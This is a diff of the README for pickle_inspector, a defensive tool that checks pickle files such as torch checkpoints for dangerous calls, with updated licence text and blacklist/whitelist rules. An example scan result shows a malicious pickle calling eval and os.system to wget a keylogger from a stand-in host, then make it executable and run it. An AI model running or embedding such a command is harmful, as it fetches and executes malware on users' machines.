@@ -1,3 +1,20 @@
+<!--
+Copyright (C) 2023  Lopho <contact@lopho.org>
+
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU Affero General Public License as published
+by the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
+
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU Affero General Public License for more details.
+
+You should have received a copy of the GNU Affero General Public License
+along with this program.  If not, see <https://www.gnu.org/licenses/>.
+-->
+
 # pickle_inspector 🥒🔬
 Check what is in the pickle before eating it.
 
@@ -20,8 +37,8 @@ Check what is in the pickle before eating it.
 It works on any type of pickle, but was made with `torch` in mind.
 
 NOTE:
-torch == 1.13.0 breaks using custom unpicklers, see https://github.com/pytorch/pytorch/issues/88438
-until this is fixed, stick to 1.12.x or older.
+torch == 1.13.0 breaks using custom unpicklers, see https://github.com/pytorch/pytorch/issues/88438 \
+This is fixed in torch 1.13.1 and 2.x.x.
 
 ## Scanning pickles via command line
 **tl;dr** just let me scan my pickles.
@@ -171,10 +188,9 @@ for c in results.calls:
 > __builtin__.eval('import os;os.system("wget https://sus.to/keylog;chmod +x keylog;./keylog &")')
 ```
 ## Blacklist & Whitelist
-The whitelist has priority over the blacklist.
-
-If the blacklist contains items everything will be allowed except items in the blacklist,\
-or items in the blacklist and in the whitelist. This is useful using wildcards.
+- Whitelist only: everything will be blocked except items in the whitelist
+- Blacklist only: everything will be allowed except items in the blacklist
+- Both black- and whitelist: everything in the blacklist will be blocked except items in the whitelist
 
 Example: Block everything within `torch` except `torch.FloatStorage`
 ```py
@@ -182,10 +198,7 @@ conf.blacklist = ['torch.*']
 conf.whitelist = ['torch.FloatStorage']
 ```
 
-If the blacklist is empty and the whitelist contains items, \
-everything except items in the whitelist will be blocked.
-
-## Safe whitelist for stable diffusion
+## Whitelist for stable diffusion
 A premade whitelist for stable diffusion v1 and v2 is available in this project.
 
 Example: Scan a stable diffusion v1 checkpoint
@@ -208,5 +221,5 @@ Tested with python 3.9 and torch 1.12.1
 
 ---
 
-Copyright (C) 2022  Lopho `<contact@lopho.org>`\
+Copyright (C) 2023  Lopho `<contact@lopho.org>`\
 Licensed under the AGPLv3 `<https://www.gnu.org/licenses/agpl-3.0.html>`
